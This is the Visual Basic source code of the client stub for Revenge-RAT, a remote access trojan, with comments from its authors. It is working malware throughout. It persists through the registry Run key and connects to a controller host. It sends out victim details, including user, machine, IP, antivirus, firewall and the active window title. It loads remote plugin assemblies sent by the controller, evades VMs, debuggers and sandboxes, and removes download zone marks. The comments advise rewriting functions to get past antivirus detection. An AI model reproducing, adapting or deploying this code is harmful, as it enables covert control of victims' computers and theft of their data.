' Fixed By NYAN CAT \\ JAN 9TH, 2018

' Revenge-RAT Client Source Code v0.3
' By N A P O L E O N
' You can update/Crypt the client again, learn if you want , some codes typed direct for beginners
' if you want good result in runtime vs AV, rewrite some functions much as you can
' Last edit: 2016/12/9

Imports Microsoft.Win32
Imports Microsoft.VisualBasic.Devices
Imports System.Management
Imports System
Imports System.Net.Sockets
Imports Microsoft.VisualBasic
Imports System.IO.Compression
Imports System.Globalization
Imports System.Diagnostics
Imports System.Reflection
Imports System.Runtime.InteropServices
Imports System.Collections.Generic
Imports System.Windows.Forms
Imports System.IO
Imports System.Net
Imports System.Threading
Imports System.Security
Imports System.Text

<Assembly: AssemblyTitle("%Title%")>
<Assembly: AssemblyDescription("%Description%")>
<Assembly: AssemblyCompany("%Company%")>
<Assembly: AssemblyProduct("%Product%")>
<Assembly: AssemblyCopyright("%Copyright%")>
<Assembly: AssemblyTrademark("%Trademark%")>
<Assembly: AssemblyFileVersion("%v1%" & "." & "%v2%" & "." & "%v3%" & "." & "%v4%")>
<Assembly: AssemblyVersion("%v1%" & "." & "%v2%" & "." & "%v3%" & "." & "%v4%")>
<Assembly: Guid("%Guid%")>

#Const INS = False
#Const VM = False
#Const DBG = False
#Const SND = False
#Const ZONE = False

Public Class Atomic
    Public OW As Boolean = False
    Public C As Object = Nothing
    Public Cn As Boolean = False
    Public SC = New Thread(AddressOf MAC, 1)
    Public PT As New Thread(AddressOf Pin)
    Public I As Integer = 1
    Public MS As Integer = 0
    Public Hosts As String() = Split("%HOSTS%,", ",")
    Public Ports As String() = Split("%PORT%,", ",")
    Public ID As String = "TGltZUJ1aWxkZXI="
    Public MUTEX As String = "RV_MUTEX-FZMONFueOciq"
    Public H As Integer = 0
    Public P As Integer = 0
    ' Replace "%H%" with you host , like this : 127.0.0.1, and ports "%P%" like this : 333,
    ' you must add "," after all host,port!
    ' Replace "%ID%" with your identification encoded in base64 utf8 , you can use encode function , %MUT% , Your mustex 
    ' and "%Socket Key%" for your socket key

    Public Shared SPL As String = "*-]NK[-*"
    Public Shared App As String = Application.ExecutablePath
    Public Shared SCG As New Atomic
    Public Shared DI As ComputerInfo = New ComputerInfo
    Public Shared Key As String = "%KEY%"
    Public Shared MT As Mutex
    Public Shared Tick As System.Threading.Timer = Nothing


    Shared Sub Main()
        SCG.Execute()
    End Sub


#If INS Then
    Sub Install()
                        Thread.Sleep(4 * 1000)

        Try
            Dim ClientFullPath As String = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.%DIR%), "%EXE%")
            If Process.GetCurrentProcess.MainModule.FileName <> ClientFullPath Then
                For Each P As Process In Process.GetProcesses
                    Try
                        If P.MainModule.FileName = ClientFullPath Then
                            P.Kill()
                        End If
                    Catch : End Try
                Next
                Using Drop As New FileStream(ClientFullPath, FileMode.Create)
                    Dim Client As Byte() = File.ReadAllBytes(Process.GetCurrentProcess.MainModule.FileName)
                    Drop.Write(Client, 0, Client.Length)
                End Using
#If ZONE Then
      DeleteZoneIdentifier(ClientFullPath)
#End If

                Thread.Sleep(2 * 1000)
                Registry.CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Run\").SetValue(Path.GetFileName(ClientFullPath), ClientFullPath)
                Process.Start(ClientFullPath)
                Environment.Exit(0)
            End If
        Catch ex As Exception
            Debug.WriteLine("Install : Failed : " + ex.Message)
            End Try
        End Sub
#End If

    Sub Execute()

#If VM Then
        VM()
#End If

#If DBG Then
        DBG()
#End If

#If SND Then
        SND()
#End If

#If INS Then
      Install()
#End If

        Try : MT = New Mutex(True, MUTEX, OW) : If Not OW Then End : AddHandler Application.ApplicationExit, Sub() MT.ReleaseMutex()
        Catch : End Try
        SC.Start() : PT.Start()
    End Sub

    Sub Pin()
RE:     If I = 0 Then : MS += 1 : End If : Thread.Sleep(1) : GoTo RE
    End Sub

    Sub data(ByVal b As Byte()) ' receive commands from RV-RAT
        Dim Rev As String() = Split(BS(b), Key)
        If Rev(0) = "PNC" Then
            I = 0
            Send("PNC")
        ElseIf Rev(0) = "P" Then
            I = 1
            Send("P" & Key & MS)
            MS = 0
            Send("W" & Key & GAW())
        ElseIf Rev(0) = "IE" Then ' Ask about plugin
            If Not Registry.CurrentUser.OpenSubKey("Software\" & Encode(MUTEX) & "\" & Rev(1), True) Is Nothing Then : Try : INV(Hosts(H), Ports(P), Rev(4), Rev(5), Encode(Decode(ID) & "_" & HWD()), Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\" & Encode(MUTEX) & "\" & Rev(1), Rev(1), Nothing).ToString, Rev(2), Rev(3), Rev(1), True) : Catch : Send("GPL" & Key & Rev(5) & Key & Rev(1) & Key & False) : End Try : Else : Send("GPL" & Key & Rev(5) & Key & Rev(1) & Key & False) : End If
        ElseIf Rev(0) = "LP" Then ' invoke plugin
            INV(Hosts(H), Ports(P), Rev(1), Rev(2), Encode(Decode(ID) & "_" & HWD()), Rev(3), Rev(4), Rev(5), Rev(6), Rev(7))
        ElseIf Rev(0) = "UNV" Then ' uninstall - restart - close .. etc
            LA(Rev(1)).CreateInstance(Rev(2)).UNI(Encode(MUTEX), Rev(3), Nothing, Nothing, Nothing, Nothing, Nothing, Nothing, Nothing, Nothing, Nothing, Nothing, Nothing, Nothing, Nothing, Nothing, Nothing, Nothing, Nothing, Nothing, Nothing, Nothing, Nothing, Nothing, Nothing, Nothing, Nothing, Nothing, Nothing, Nothing, Nothing, Nothing, Rev(4), Rev(5), App, Rev(6), Rev(7), Rev(8), Rev(9), Rev(10), Rev(11), Rev(12), Rev(13))
        End If
    End Sub

    Public Function INV(ByVal H As String, P As String, N As String, C As String, ID As String, Bytes As String, S As Integer, M As Boolean, MD5 As String, B As Boolean) ' invoke plugin
        LA(Bytes).CreateInstance(N & "." & C, True).Start(ID, S, H, P, Key, SPL) : If M Then : Try : If Registry.CurrentUser.OpenSubKey("Software\" & Encode(MUTEX) & "\" & MD5, True) Is Nothing Then : IR("HKEY_CURRENT_USER\SOFTWARE\" & Encode(MUTEX) & "\" & MD5, MD5, Bytes) : End If : Catch : End Try : If B = False Then : IR("HKEY_CURRENT_USER\SOFTWARE\" & Encode(MUTEX) & "\" & MD5, MD5, Bytes) : End If : End If
    End Function

    Public Function LA(B As String) ' load assembly
        Return Reflection.Assembly.Load(Decompress(Convert.FromBase64String(B)))
    End Function

    Public Function IR(ByVal P As String, N As String, B As String) ' add reg value
        Try : Registry.SetValue(P, N, B) : Catch : End Try
    End Function

    Sub MAC()

        Dim M As Object = New MemoryStream
        Dim lp As Integer = 0
re:
        Try : Try : EmptyWorkingSet(Process.GetCurrentProcess.Handle) : Catch : End Try : Catch : End Try
        Try
            If C Is Nothing Then GoTo e
            If C.Client.Connected = False Then GoTo e
            If Cn = False Then GoTo e
            lp += 1
            If lp > 300 Then
                lp = 0
                If C.Client.Poll(-1, Sockets.SelectMode.SelectRead) And C.Client.Available <= 0 Then GoTo e
            End If
            If C.Available > 0 Then
                Dim B(C.Available - 1) As Byte
                C.Client.Receive(B, 0, B.Length, Sockets.SocketFlags.None)
                M.Write(B, 0, B.Length)
rr:
                If BS(M.ToArray).Contains(SPL) Then
                    Dim A As Array = fx(M.ToArray, SPL)
                    Dim T As New Thread(AddressOf data)
                    T.Start(A(0))
                    M.Dispose()
                    M = New IO.MemoryStream
                    If A.Length = 2 Then
                        M.Write(A(1), 0, A(1).length)
                        GoTo rr
                    End If
                End If
            End If
        Catch
            GoTo e
        End Try
        Thread.CurrentThread.Sleep(1)
        GoTo re
e:
        Try : Try : EmptyWorkingSet(Process.GetCurrentProcess.Handle) : Catch : End Try : Catch : End Try
        Cn = False
        Try
            C.Client.Disconnect(False)
        Catch
        End Try
        Try
            M.Dispose()
        Catch
        End Try
        Try
            Tick.Dispose()
        Catch
        End Try
        M = New MemoryStream
        Dim IC As Boolean = False
        For Count As Integer = 0 To Hosts.Length - 2
            Try
                C = New Sockets.TcpClient() With {.ReceiveTimeout = -1, .SendTimeout = -1, .SendBufferSize = 999999, .ReceiveBufferSize = 999999}
                lp = 0
                CK().Connect(Hosts(Count), Ports(Count))
                Cn = True

                Send("Information" & Key & ID & Key & Encode("_" & HWD()) & Key & IP() & Key & Encode(Environment.MachineName & " / " & Environment.UserName) & Key & CIVC() & Key & Encode(DI.OSFullName & " " & OP()) & Key & Encode(MP()) & Key & DI.TotalPhysicalMemory & Key & GetProduct("Select * from AntiVirusProduct") & Key & GetProduct("SELECT * FROM FirewallProduct") & Key & Ports(P) & Key & GAW() & Key & Encode(CultureInfo.CurrentCulture.Name) & Key & "False") ' RVUS for make this client special color in lv , true for spread , RVUS for you , and false mean this client didn't come from spread
                H = Count
                P = Count
                IC = True
                Dim T As New TimerCallback(AddressOf Ping)
                Tick = New Threading.Timer(T, Nothing, 15000, 15000)
                GoTo re
            Catch
                Thread.Sleep(2500) ' replace it for reconnect time in ms , like 2500 or 5000
                H = 0
                P = 0
            End Try
        Next
        If IC = True Then
            IC = False
            GoTo e
        End If
        GoTo re
    End Sub

    Sub Ping()
        Send("alive??")
    End Sub

    Function CK()
        Return C.Client
    End Function

    Public Sub Send(ByVal b As Byte())
        If Cn = False Then Exit Sub
        Try
            Dim r As Object = New MemoryStream
            r.Write(b, 0, b.Length)
            r.Write(SB(SPL), 0, SPL.Length)
            C.Client.SendBufferSize = b.Length
            C.Client.Poll(-1, Net.Sockets.SelectMode.SelectWrite)
            C.Client.Send(r.ToArray, 0, r.Length, Sockets.SocketFlags.None)
            r.Dispose()
        Catch
            Cn = False
        End Try
    End Sub

    Public Sub Send(ByVal S As String)
        Send(SB(S))
    End Sub

    Public Function IP()
        Try : Return CType(Dns.GetHostByName(Dns.GetHostName()).AddressList.GetValue(0), IPAddress).ToString() : Catch : Return "????" : End Try
    End Function

    Private Declare Function GVI Lib "kernel32" Alias "GetVolumeInformationA" (ByVal IP As String, ByVal V As String, ByVal T As Integer, ByRef H As Integer, ByRef Q As Integer, ByRef G As Integer, ByVal J As String, ByVal X As Integer) As Integer : Private Declare Function GFW Lib "user32" Alias "GetForegroundWindow" () As IntPtr : Private Declare Auto Function GetWindowText Lib "user32" (ByVal hWnd As IntPtr, ByVal lpString As StringBuilder, ByVal cch As Integer) As Integer : Declare Function capGetDriverDescriptionA Lib "avicap32.dll" (ByVal wDriver As Short, ByVal lpszName As String, ByVal cbName As Integer, ByVal lpszVer As String, ByVal cbVer As Integer) As Boolean
    <Runtime.InteropServices.DllImport("psapi")>
    Public Shared Function EmptyWorkingSet(ByVal hProcess As Long) As Boolean
    End Function

    Public Function HWD() As String
        Try : Dim HSN As Integer : GVI(Environ("SystemDrive") & "\", Nothing, Nothing, HSN, 0, 0, Nothing, Nothing) : Return Hex(HSN) : Catch : Return "ERR" : End Try
    End Function

    Public Function CIVC() As String
        Try : For i As Integer = 0 To 4 : If capGetDriverDescriptionA(i, Space(100), 100, Nothing, 100) Then : Return "Yes" : End If : Next : Catch : End Try : Return "No"
    End Function

    Public Shared Function OP() As String
        Try : For Each SC As ManagementObject In New ManagementObjectSearcher("select * from Win32_Processor").[Get]() : Return Convert.ToInt32(SC("AddressWidth")) : Next : Catch : Return "????" : End Try
    End Function

    Public Function GetProduct(ByVal Product As String) As String
        Try : Dim PN As String = String.Empty : For Each AV As ManagementObject In New ManagementObjectSearcher("root\SecurityCenter" & IIf(DI.OSFullName.Contains("XP"), "", "2").ToString, Product).Get : PN &= AV("displayName").ToString : Next : If Not PN = String.Empty Then : Return Encode(PN) : Else : Return Encode("N/A") : End If : Catch : Return Encode("N/A") : End Try
    End Function

    Public Function MP()
        Try : Return Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\SYSTEM\CENTRALPROCESSOR\0", "ProcessorNameString", Nothing).ToString : Catch : Return "????" : End Try
    End Function

    Public Function GAW() As String
        Dim W As New StringBuilder(256) : GetWindowText(GFW(), W, W.Capacity) : Return Encode(W.ToString())
    End Function

    Function SB(ByVal s As String) As Byte()
        Return Encoding.Default.GetBytes(s)
    End Function

    Function BS(ByVal b As Byte()) As String
        Return Encoding.Default.GetString(b)
    End Function

    Function fx(ByVal b As Byte(), ByVal WRD As String) As Array
        Dim a As New List(Of Byte()), M As New MemoryStream, MM As New MemoryStream, T As String() = Split(BS(b), WRD) : M.Write(b, 0, T(0).Length) : MM.Write(b, T(0).Length + WRD.Length, b.Length - (T(0).Length + WRD.Length)) : a.Add(M.ToArray) : a.Add(MM.ToArray) : M.Dispose() : MM.Dispose() : Return a.ToArray
    End Function

    Public Function Decompress(data As Byte()) As Byte()
        Dim input As New MemoryStream() : input.Write(data, 0, data.Length) : input.Position = 0
        Dim gzip As New GZipStream(input, CompressionMode.Decompress, True), output As New MemoryStream(), buff As Byte() = New Byte(63) {}, read As Integer = -1
        read = gzip.Read(buff, 0, buff.Length) : While read > 0 : output.Write(buff, 0, read) : read = gzip.Read(buff, 0, buff.Length) : End While : gzip.Close() : Return output.ToArray()
    End Function

    Public Function Encode(ByVal Input As String)
        Return Convert.ToBase64String(Encoding.UTF8.GetBytes(Input))
    End Function

    Public Function Decode(ByVal Input As String)
        Return Encoding.UTF8.GetString(Convert.FromBase64String(Input))
    End Function

#If VM Then
    Public Sub VM()
        Dim VM = Microsoft.Win32.Registry.LocalMachine.CreateSubKey("System\CurrentControlSet\Services\Disk\Enum\", RegistryKeyPermissionCheck.ReadSubTree).GetValue("0", "")
        If VM.ToString.ToLower.Contains("vmware") OrElse VM.ToString.ToLower.Contains("qemu") Then
            Environment.FailFast(Nothing)
        ElseIf IO.File.Exists(Environment.GetEnvironmentVariable("windir") & "\vboxhook.dll") Then
            Environment.FailFast(Nothing)
        End If
    End Sub
#End If

#If DBG Then
        Public Sub DBG()
        If Diagnostics.Debugger.IsLogging OrElse Diagnostics.Debugger.IsAttached Then
            Environment.FailFast(Nothing)
        End If
    End Sub
#End If

#If SND Then
        <Runtime.InteropServices.DllImport("kernel32.dll")>
    Public Shared Function LoadLibrary(ByVal dllToLoad As String) As Boolean
    End Function
    Public Sub SND()
        If LoadLibrary("SbieDll.dll") Then
            Environment.FailFast(Nothing)
        End If
    End Sub
#End If

#If ZONE Then
    <Runtime.InteropServices.DllImport("kernel32.dll", CharSet:=Runtime.InteropServices.CharSet.Auto, BestFitMapping:=False, ThrowOnUnmappableChar:=True, SetLastError:=True)>
    Shared Function DeleteFile(<Runtime.InteropServices.MarshalAs(Runtime.InteropServices.UnmanagedType.LPTStr)> ByVal filepath As String
            ) As <Runtime.InteropServices.MarshalAs(Runtime.InteropServices.UnmanagedType.Bool)> Boolean
    End Function
    Sub DeleteZoneIdentifier(ByVal filePath As String)
        Try : DeleteFile(filePath + ":Zone.Identifier") : Catch : End Try
    End Sub
#End If

End Class